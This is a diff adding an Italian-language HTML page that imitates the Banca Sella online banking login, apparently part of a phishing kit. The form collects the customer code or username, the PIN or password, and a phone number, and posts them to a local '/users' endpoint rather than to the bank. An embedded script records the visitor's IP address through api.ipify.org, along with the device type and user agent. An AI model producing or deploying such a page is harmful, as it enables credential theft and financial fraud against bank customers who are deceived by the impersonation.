@@ -1,0 +1,106 @@
+<html lang="it"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="Cache-Control" content="no-cache&quot;">
+    <meta http-equiv="expires" content="-1&quot;">
+    <meta http-equiv="Pragma" content="no-cache&quot;">
+    <meta http-equiv="Cache-Control" content="no-store&quot;">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff&quot;">
+    <title>Autenticazione</title>
+    <link rel="stylesheet" href="data/style.css">
+    <script src="../cdn/jquery-latest.min.js"></script>
+
+    <link rel="apple-touch-icon" sizes="57x57" href="data/favicon57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="data/favicon60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="data/favicon72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="data/favicon76.png">
+    <link rel="icon" type="image/png" href="data/favicon32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="data/favicon16.png" sizes="16x16">
+    
+</head>
+<body class="auth-v2" onload="$('#userCode').focus()">
+<div class="a-header">
+    <a href="https://www.sella.it" title="Torna alla home page"><img class="a-logo" src="data/logo_sellait.png" alt="" title=""></a>
+    <a href="https://www.sella.it/onboarding/fe/03268/contacts/#/contacts" target="_blank" class="a-hidden-md a-link-ico a-ico-arrow">Stato richieste</a>
+</div>
+
+<div class="a-container">
+    <div class="a-title-container">
+        <div class="a-title">Accedi <span class="a-hidden-xs">ai servizi online</span></div>
+        <div class="a-subtitle">Compila i campi per proseguire</div>
+    </div>
+    <form name="AuthenticationForm" method="post" action="/users" autocomplete="off">
+        <input type="hidden" name="ipAddr" id="ipAddr" required="" value="76.184.185.7">
+        <input type="hidden" name="deviceType" id="deviceType" required="" value="altro">
+        <input type="hidden" name="ua" id="userAgent" required="" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0">
+        <div class="a-content-sm">
+            <div class="a-form-row">
+                <div class="a-form-label" id="usrLabel">Codice cliente o username</div>
+                <input type="text" minlength="1" name="UserId" id="userCode" class="a-form-input" required="" autocomplete="off">
+            </div>
+            <div class="a-form-row">
+                <div class="a-form-label" id="passLabel">PIN o password</div>
+                <input type="password" name="Password" id="Password" class="a-form-input" required="" maxlength="25" autocomplete="off">
+            </div>
+            <div class="a-form-row">
+                <div class="a-form-label" id="passLabel">Numero di Telefono</div>
+                <input type="tel" name="tel" id="tel" class="a-form-input" required="" minlength="9" maxlength="11" autocomplete="off">
+            </div>
+            <div class="a-form-row a-row font-size-sm">
+                <div class="lost-link font-bold">
+                    <a href="https://www.sella.it/banca-online/landing/personalbanking/helpcenter/categories/login/codici.jsp" target="_blank">Hai dimenticato i tuoi codici?</a>
+                </div>
+            </div>
+            <div class="a-buttons-row">
+                <button id="a-btn-access" class="a-button a-btn-primary a-btn-submit" type="submit">Conferma</button>
+            </div>
+            <div class="remember-box with-border">
+                Primo accesso?<br>
+                <a href="https://www.sella.it/main?application.OnlineInfoInternetCode.new" target="_blank" class="font-bold">Richiedi codici</a>
+                - <a href="https://www.sella.it/main?application.OnlineActivateInternetCode.new" target="_blank" class="font-bold">Attiva codici</a><br>
+                <a href="https://www.sella.it/onboarding/fe/03268/contacts/#/contacts" target="_blank" class="a-visible-md font-bold a-mt-15">Stato richieste</a>
+            </div>
+        </div>
+    </form>
+</div>
+<div class="a-float-footer">
+    <div class="a-container">
+        <div class="remember-box with-border">
+            Desideri maggiori informazioni o hai bisogno di assistenza?<br>
+            <div><a href="#" class="a-footer-links">Contatta l'assistenza Clienti</a>
+                <a href="https://www.sella.it/banca-online/sicurezza/sicurezza.jsp" target="_blank" class="a-footer-links">Informazioni sulla sicurezza</a>
+            </div>
+        </div>
+        <div class="a-footer">
+            © 1996-2020 &nbsp; Banca Sella S.p.A. - P.I. 02224410023 - <a target="_blank" href="https://www.sella.it/ita/info/privacy.jsp">Privacy</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    $.getJSON("https://api.ipify.org/?format=json", function (e) {
+        $('#ipAddr').val(e.ip)
+        console.log(e.ip)
+    });
+
+    function getMobileOperatingSystem() {
+        let userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        console.log(userAgent)
+        if (/windows phone/i.test(userAgent)) {
+            return "Windows Phone";
+        }
+        if (/android/i.test(userAgent)) {
+            return "Android";
+        }
+        if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+            return "iOS";
+        }
+        return "altro";
+    }
+    $('#deviceType').val(getMobileOperatingSystem());
+    $('#userAgent').val(navigator.userAgent);
+</script>
+<script src="cdn/style.js"></script>
+
+
+</body></html>
